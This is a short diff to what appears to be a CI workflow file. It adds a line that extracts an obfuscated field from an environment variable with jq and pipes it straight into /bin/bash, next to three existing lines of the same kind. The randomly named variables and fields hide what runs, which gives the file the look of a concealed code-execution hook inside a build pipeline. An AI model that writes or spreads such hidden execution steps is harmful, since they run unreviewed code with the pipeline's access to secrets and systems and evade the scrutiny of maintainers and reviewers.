@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$f60665" | jq -r .g562 | /bin/bash
           echo $antf784 | jq -r .qaw62115 | /bin/bash
           echo $xfxxp65 | jq -r .uxiv68 | /bin/bash
+          printf '%s' "$afh4" | jq -r .v5848 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
